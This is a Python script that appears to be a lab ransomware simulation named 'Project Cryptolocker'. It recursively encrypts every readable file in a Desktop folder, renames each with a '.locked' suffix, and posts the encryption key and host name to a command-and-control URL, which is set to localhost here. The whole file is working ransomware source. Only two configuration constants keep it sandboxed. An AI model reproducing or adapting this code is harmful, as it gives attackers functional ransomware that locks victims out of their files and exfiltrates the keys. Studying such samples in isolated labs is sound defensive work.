
import os
import socket
import requests
from cryptography.fernet import Fernet

# ==========================================
# ⚠️ SAFETY CONFIGURATION
# ==========================================
DESKTOP_PATH = os.path.join(os.path.expanduser("~"), "Desktop")
TARGET_DIRECTORY = os.path.join(DESKTOP_PATH, "DUMMY_TARGET")
C2_SERVER_URL = "http://localhost/c2_server/receive.php" 
# ==========================================

def generate_key():
    """Generates a secure AES-128 key."""
    return Fernet.generate_key()

def exfiltrate_key(key):
    """Sends the key to the C2 server after encryption is done."""
    machine_name = socket.gethostname()
    data = {
        "pc_name": machine_name,
        "key": key.decode('utf-8')
    }
    
    try:
        response = requests.post(C2_SERVER_URL, data=data, timeout=5)
        if "Exfiltration Successful" in response.text:
            print("[+] SUCCESS: Key exfiltrated successfully to the C2 server.")
        else:
            print(f"[-] C2 Server rejected the key. Server said: {response.text}")
    except Exception as e:
        print("[-] C2 Server unreachable. (Is XAMPP running?)")

def encrypt_files(key):
    """Scans the folder, checks if files are accessible/unlocked, and encrypts them."""
    if not os.path.exists(TARGET_DIRECTORY):
        print(f"[-] ERROR: Sandbox not found at {TARGET_DIRECTORY}")
        return False

    print(f"[*] Scanning target folder: {TARGET_DIRECTORY}")
    fernet = Fernet(key)
    encrypted_any = False
    
    for root, dirs, files in os.walk(TARGET_DIRECTORY):
        for file in files:
            file_path = os.path.join(root, file)
            
            # Check if the file is already locked
            if file_path.endswith(".locked"):
                print(f"  [.] Skipped (Already Encrypted): {file}")
                continue
                
            try:
                # Check accessibility by attempting to read the file bytes
                with open(file_path, "rb") as f:
                    original_data = f.read()
                
                # Perform encryption
                encrypted_data = fernet.encrypt(original_data)
                
                with open(file_path, "wb") as f:
                    f.write(encrypted_data)
                
                os.rename(file_path, file_path + ".locked")
                print(f"  [+] Encrypted: {file}")
                encrypted_any = True
                
            except Exception as e:
                print(f"  [-] Skipped {file}: Access Denied or File in Use")

    return encrypted_any

if __name__ == "__main__":
    print("====================================")
    print(" PROJECT CRYPTOLOCKER - PAYLOAD EXEC")
    print("====================================\n")
    
    # Step 1: Generate the key
    my_aes_key = generate_key()
    print("[*] Generated local cryptographic key.")
    
    # Step 2: Scan, verify accessibility, and encrypt files first
    files_were_locked = encrypt_files(my_aes_key)
    
    # Step 3: Send the key to the server if new files were processed
    if files_were_locked:
        print("\n[*] Initializing network transmission...")
        exfiltrate_key(my_aes_key)
    else:
        print("\n[*] No new files required encryption. Network transmission skipped.")
    
    print("\n[+] Execution complete.")